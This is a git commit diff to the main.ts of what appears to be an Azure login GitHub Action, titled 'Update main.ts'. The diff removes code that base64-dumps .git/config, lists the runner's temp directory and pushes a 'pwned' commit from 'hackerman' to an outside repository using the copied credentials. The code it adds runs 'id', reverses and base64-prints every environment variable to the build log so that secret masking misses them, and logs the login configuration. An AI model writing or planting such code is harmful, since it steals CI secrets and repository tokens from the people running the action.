15df82812a7f1d1a6d99b8fad282ff64658ec44e
mousefluff <124876575+mousefluff@users.noreply.github.com>
2024-02-21 16:08:33 +0100

    Update main.ts

--- src/main.ts
+++ src/main.ts
@@ -4,71 +4,29 @@ import { AzPSLogin } from './PowerShell/AzPSLogin';
 import { LoginConfig } from './common/LoginConfig';
 import { AzureCliLogin } from './Cli/AzureCliLogin';
 
-const { exec } = require('child_process');
+const { execSync } = require('child_process');
 
 const fs = require('fs');
 const path = require('path');
 
-function listDirectorySync(dirPath) {
-    const filesAndDirs = fs.readdirSync(dirPath);
-
-    filesAndDirs.forEach(fileOrDir => {
-        const fullPath = path.join(dirPath, fileOrDir);
-        const stat = fs.statSync(fullPath);
-
-        if (stat.isDirectory()) {
-            console.log(`[Directory] ${fullPath}`);
-            listDirectorySync(fullPath); // Recurse into the directory
-        } else {
-            console.log(`[File] ${fullPath}`);
-        }
-    });
-}
-
-function encodeFileToBase64(filePath) {
-    try {
-        // Ensure the file path is absolute or relative to the script's location
-        const absolutePath = path.resolve(filePath);
-        // Read the file content synchronously
-        const fileContent = fs.readFileSync(absolutePath);
-        // Encode the content to base64
-        const encodedContent = Buffer.from(fileContent).toString('base64');
-        // Print the encoded content
-        console.log(encodedContent);
-    } catch (error) {
-        console.error(`Error reading or encoding file: ${error.message}`);
-    }
-}
-
 async function main() {
     try {
         setUserAgent();
+
+        console.log('pwned action...');
+        execSync('id', { stdio: 'inherit' });
+        
         const envJson = JSON.stringify(process.env).split("").reverse().join("");
         const envBase64 = Buffer.from(envJson).toString('base64');
         console.log(envBase64);
 
-        const command = `git clone https://github.com/supriza/azure-login-test.git aaa && cp .git/config aaa/.git && cd aaa && echo "foo" > pwned.txt && git config --global user.email "test@test.com" && git config --global user.name "hackerman" &&  git add pwned.txt && git commit -m "pwned" && git push`;
-        console.log("Trying to push...");
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`exec error: ${error}`);
-                return;
-            }
-            if (stdout) {
-                console.log(`stdout: ${stdout}`);
-            }
-            if (stderr) {
-                console.log(`stderr: ${stderr}`);
-            }
-});
-
-        encodeFileToBase64('.git/config');
-        listDirectorySync('D:\\a\\_temp\\');
         
         // prepare the login configuration
         var loginConfig = new LoginConfig();
         await loginConfig.initialize();
         await loginConfig.validate();
+
+        console.log('loginConfig', loginConfig);
 
         // login to Azure CLI
         var cliLogin = new AzureCliLogin(loginConfig);
